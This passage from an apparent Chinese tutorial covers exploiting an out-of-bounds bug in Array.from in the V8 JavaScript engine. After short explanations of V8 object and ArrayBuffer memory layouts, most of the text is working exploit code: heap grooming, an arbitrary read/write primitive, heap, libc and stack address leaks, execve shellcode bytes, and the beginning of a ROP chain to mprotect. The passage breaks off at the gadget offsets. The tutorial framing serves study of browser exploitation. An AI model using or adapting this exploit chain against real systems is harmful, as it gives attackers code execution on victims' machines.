最低位为1，在访问时需要将最低位置回0
### JsObject
在V8中，JavaScript对象初始结构如下所示
    [ hiddenClass / map ] -> ... ; 指向Map
    [ properties        ] -> [empty array]
    [ elements          ] -> [empty array]
    [ reserved #1       ] -\
    [ reserved #2       ]  |
    [ reserved #3       ]  }- in object properties,即预分配的内存空间
    ...............        |
    [ reserved #N       ] -/
  * Map中存储了一个对象的元信息，包括对象上属性的个数，对象的大小以及指向构造函数和原型的指针等等。同时，Map中保存了Js对象的属性信息，也就是各个属性在对象中存储的偏移。然后属性的值将根据不同的类型，放在properties、element以及预留空间中。
  * properties指针，用于保存通过属性名作为索引的元素值，类似于字典类型
  * elements指针，用于保存通过整数值作为索引的元素值，类似于常规数组
  * reserved #n，为了提高访问速度，V8在对象中预分配了的一段内存区域，用来存放一些属性值（称为in-object属性），当向object中添加属性时，会先尝试将新属性放入这些预留的槽位。当in-onject槽位满后，V8才会尝试将新的属性放入properties中。  
当然，这里的介绍十分简略，详细细节可以参考文末给出的一些参考链接
### ArrayBuffer && TypedArray
  * ArrayBuffer  
ArrayBuffer 对象用来表示通用的、固定长度的原始二进制数据缓冲区。ArrayBuffer
不能直接操作，而是要通过“视图”进行操作。“视图”部署了数组接口，这意味着，可以用数组的方法操作内存。
  * TypedArray  
用来生成内存的视图，通过9个构造函数，可以生成9种数据格式的视图，比如Uint8Array（无符号8位整数）数组视图,
Int16Array（16位整数）数组视图, Float64Array（64位浮点数）数组视图等等。
简单的说，ArrayBuffer就代表一段原始的二进制数据，而TypedArray代表了一个确定的数据类型，当TypedArray与ArrayBuffer关联，就可以通过特定的数据类型格式来访问内存空间。  
这在我们的利用中十分重要，因为这意味着我们可以在一定程度上像C语言一样直接操作内存。
**内存结构**  
在ArrayBuffer中存在一个BackingStore指针，这个指针指向的就是ArrayBuffer开辟的内存空间，可以使用TypedArray指定的类型读取和写入该区域，并且，这片内存区域是位于系统堆中的而不是属于GC管理的区域。  
常见利用有：
  1. 可以如果修改ArrayBuffer中的Length，那么就能够造成越界访问。
  2. 如果能够修改BackingStore指针，那么就可以获得任意读写的能力了，这是非常常用的一个手段
  3. 可以通过BackingStore指针泄露堆地址，还可以在堆中布置shellcode。
### JsFunction
在V8利用中，function也常常成为利用的一个目标。其内存结构如下：  
其中，CodeEntry是一个指向JIT代码的指针（RWX区域），如果具有任意写能力，那么可以向JIT代码处写入自己的shellcode，实现任意代码执行。  
但是，在v8 6.7版本之后，function的code不再可写，所以不能够直接修改jit代码了。 **本文漏洞将不采用修改jit代码的方法** 。  
（注：内存布局图是根据sakura师傅的博客重画的，但是我调试后发现，貌似函数代码指针应该在`kLiteralsOffset`的位置）  
## 自制类型转换小工具
在v8利用中，不可避免的会读写内存。而读写内存就会使用到前文提到的`ArrayBuffer &&
TypedArray`。在64位程序中，因为没有`Uint64Array`，所以要读写8字节的内存单元只能使用`Float64Array`（或者两个`Uint32`），但是float类型存储为小数编码，所以为了方便读写，我们需要自己实现一个Uint64与Float64之间转换的小工具
    class Memory{
        constructor(){
            this.buf = new ArrayBuffer(8);
            this.f64 = new Float64Array(this.buf);
            this.u32 = new Uint32Array(this.buf);
            this.bytes = new Uint8Array(this.buf);
        }
        d2u(val){        //double ==> Uint64
            this.f64[0] = val;
            let tmp = Array.from(this.u32);
            return tmp[1] * 0x100000000 + tmp[0];
        }
        u2d(val){        //Uint64 ==> double
            let tmp = [];
            tmp[0] = parseInt(val % 0x100000000);
            tmp[1] = parseInt((val - tmp[0]) / 0x100000000);
            this.u32.set(tmp);
            return this.f64[0];
        }
    }
    var mem = new Memory();
## 任意读写能力
根据前文对poc的分析，可以知道，我们能够构造出一个可以越界访问的数组（属性length值 > 实际长度）。  
那么，如果可以在该数组后面内存中布置一些我们可控的对象，如ArrayBuffer，那么就可以通过修改BackingStore来实现任意读写了。  
这里，我们还想要能够泄露任意对象的地址，可以在oobArray后布置一个普通js对象，只要将目标对象作为该对象的属性值（in-object属性），然后通过越界读取，就可以泄露出目标对象的地址了。
注意，利用过程需要使用release编译的文件。
    var bufs = [];
    var objs = [];
    var oobArray = [1.1];
    var maxSize = 1028 * 8;
    Array.from.call(function() { return oobArray; }, {[Symbol.iterator] : _ => (
        {
            counter : 0,
            next() {
                let result = 1.1;
                this.counter++;
                if (this.counter > maxSize) {
                    oobArray.length = 1;
                    for (let i = 0;i < 100;i++) {
                        bufs.push(new ArrayBuffer(0x1234));
                        let obj = {'a': 0x4321, 'b': 0x9999};
                        objs.push(obj);
                    }
                    return {done: true};
                } else {
                    return {value: result, done: false};
                }
            }
        }
    )});
首先创建两个列表，bufs用于存储ArrayBuffer对象，objs用于存储普通Js对象
在最后一次迭代中，先将oobArray的长度缩减为1（不能为0，否则对象将被回收），然后创建100个ArrayBuffer对象和普通js对象，我们希望创建的这些对象能够有一个落在oobArray所在内存后方，能够通过越界访问控制。
然后我们就需要通过越界访问，对内存进行搜索，判断是否有我们创建的可控对象。  
其中ArrayBuffer是通过搜索其length值0x1234（在内存中Smi表示为0x123400000000）来定位  
普通js对象通过搜索其'a'属性的值0x4321（在内存中Smi表示为0x432100000000）来定位
    // 可控的buf在oobArray的第i个元素处
    let buf_offset = 0;
    for(let i = 0; i < maxSize; i++){
        let val = mem.d2u(oobArray[i]);
        if(val === 0x123400000000){
            console.log("buf_offset: " + i.toString());
            buf_offset = i;
            oobArray[i] = mem.u2d(0x121200000000);  //修改可控buf的length，做个标记
            oobArray[i + 3] = mem.u2d(0x1212);      //有两处保存了length值
            break;
        }
    }
    // 可控的obj在oobArray的第i个元素处
    let obj_offset = 0
    for(let i = 0; i < maxSize; i++){
        let val = mem.d2u(oobArray[i]);
        if(val === 0x432100000000){
            console.log("obj_offset: " + i.toString());
            obj_offset = i;
            oobArray[i] = mem.u2d(0x567800000000);  //修改可控obj的属性a，做个标记
            break;
        }
    }
    // bufs中的第i个buf是可控的
    let controllable_buf_idx = 0;
    for(let i = 0; i < bufs.length; i++){
        let val = bufs[i].byteLength;
        if(val === 0x1212){                         //查找被修改了length的buf
            console.log("found controllable buf at idx " + i.toString());
            controllable_buf_idx = i;
            break;
        }
    }
    // objs中第i个obj是可控的
    let controllable_obj_idx = 0;
    for(let i = 0; i < objs.length; i++){
        let val = objs[i].a;
        if(val === 0x5678){                         //查找属性a被修改了的obj
            console.log("found controllable obj at idx " + i.toString());
            controllable_obj_idx = i;
            break;
        }
    }
这样我们就成功获得了一个可控的ArrayBuffer和一个JS对象，然后就可以写一个小工具来方便我们的任意读写了。
    class arbitraryRW{
        constructor(buf_offset, buf_idx, obj_offset, obj_idx){
            this.buf_offset = buf_offset;
            this.buf_idx = buf_idx;
            this.obj_offset = obj_offset;
            this.obj_idx = obj_idx;
        }
        leak_obj(obj){
            objs[this.obj_idx].a = obj;                     //修改obj.a的值为目标对象
            return mem.d2u(oobArray[this.obj_offset]) - 1;  //读出属性a的值，因为oobArray是以double的格式读出，所以需要转换为Uint64
        }
        read(addr){
            let idx = this.buf_offset;
            oobArray[idx + 1] = mem.u2d(addr);              //修改BackingStore指针指向目标地址
            oobArray[idx + 2] = mem.u2d(addr);              //修改BitField指针指向目标地址（因为调试发现该值总和BackingStore相同）
            let tmp = new Float64Array(bufs[this.buf_idx], 0, 0x10);
            return mem.d2u(tmp[0]);
        }
        write(addr, val){
            let idx = this.buf_offset;
            oobArray[idx + 1] = mem.u2d(addr);
            oobArray[idx + 2] = mem.u2d(addr);
            let tmp = new Float64Array(bufs[this.buf_idx], 0, 0x10);
            tmp.set([mem.u2d(val)]);                        //将欲存储的Uint64值转为double形式写入
        }
    }
    var arw = new arbitraryRW(buf_offset, controllable_buf_idx, obj_offset, controllable_obj_idx);
## 信息泄露
在拥有了任意读写的能力后，其实已经可以通过改写函数jit代码来实现任意代码执行了。  
但是我在编译完v8后发现，该版本为6.7，恰好是已经不能够修改jit代码的版本了，所以还得使用其他办法（ROP）
### 泄露堆地址
我们知道，BackingStore指针指向的就是系统堆的地址，只需要通过越界读取ArrayBuffer就能泄露出来
    var heap_addr = mem.d2u(oobArray[buf_offset + 1]) - 0x10
    console.log("heap_addr: 0x" + heap_addr.toString(16));
### 泄露libc基址
关于泄露libc的办法，我没有在网上搜到比较详细的方法（没有看懂[Sakura师傅的方法](http://eternalsakura13.com/2018/11/19/justintime/)）
所以我采用了一个比较暴力的办法—————搜索堆内存。
因为ctf
pwn的经验，我知道在堆内存中一定存在某个堆块的fd或者bk指向libc中的地址。所以我尝试通过堆块的size和prevsize遍历堆中的chunk，搜索libc地址。
这里我认为在fd或者bk位置上的数值，只要是0x7f开头的，一定是libc中的`&main_arena+88`。  
同时，又因为libc基址是12位对齐的，所以将搜索到的地址减去固定偏移`0x3c4000`（根据libc版本而定），即可获得基址
    let curr_chunk = heap_addr;
    let searched = 0;
    for(let i = 0; i < 0x5000; i++){
        let size = arw.read(curr_chunk + 0x8);
        let prev_size = arw.read(curr_chunk);
        if(size !== 0 && size % 2 === 0 && prev_size <= 0x3f0){
            let tmp_ptr = curr_chunk - prev_size;
            let fd = arw.read(tmp_ptr + 0x10);
            let bk = arw.read(tmp_ptr + 0x18)
            if(parseInt(fd / 0x10000000000) === 0x7f){
                searched = fd;
                break;
            }else if(parseInt(bk / 0x10000000000) === 0x7f){
                searched = bk;
                break;
            }
        } else if(size < 0x20) {
            break;
        }
        size = parseInt(size / 8) * 8
        curr_chunk += size;
    }
    if(searched !== 0){
        var libc_base = parseInt((searched - 0x3c4000) / 0x1000) * 0x1000;
        console.log("searched libc_base: 0x" + libc_base.toString(16));
    } else {
        console.log("Not found")
    }
这里我是以事先泄露的堆地址为起点进行搜索的，所以平均情况下，实际只搜索了一半的堆内存，有一定几率没有结果。
### 泄露栈地址
泄露栈地址的原因在后文会进行解释。
在libc中存在一个全局变量叫做environ，是一个指向环境变量的指针，而环境变量恰好是存储在栈上高地址的，所以可以通过这个指针泄露出栈的地址。
    let environ_addr = libc_base + 0x3C6F38;
    let stack_addr = arw.read(environ_addr);
    console.log("stack_addr: 0x" + stack_addr.toString(16));
注意，在使用栈地址时要适当的减一些，不要修改到了高地址的环境变量，否则容易abort。
## 布置shellcode
在成功泄露出libc基址之后，如果按照ctf中getshell的思路，其实已经可以通过将malloc_hook修改为one_gadget实现getshell。
但是，这里我们想要获得的是任意代码执行，所以还是得通过shellcode的方案。
    let sc = [0x31, 0xc0, 0x48, 0xbb, 0xd1, 0x9d, 0x96, 0x91, 0xd0, 0x8c, 0x97, 0xff, 0x48, 0xf7, 0xdb, 0x53, 0x54, 0x5f, 0x99, 0x52, 0x57, 0x54, 0x5e, 0xb0, 0x3b, 0x0f, 0x05];
    let shellcode = new Uint8Array(2048);
    for(let i = 0; i < sc.length; i++){
        shellcode[i] = sc[i];
    }
    let shell_addr = arw.read(arw.leak_obj(shellcode) + 0x68);
    console.log("shell_addr: 0x" + shell_addr.toString(16));
这里我将shellcode全部写入了一个ArrayBuffer中，然后泄露出了shellcode的地址
## ROP
布置完成shellcode之后，我们需要通过rop来修改shellcode所在内存执行权限。
首先构造出我们的rop链
    let pop_rdi = 0x0000000000021102 + libc_base;
    let pop_rsi = 0x00000000000202e8 + libc_base;
    let pop_rdx = 0x0000000000001b92 + libc_base;
    let mprotect = 0x0000000000101770 +libc_base;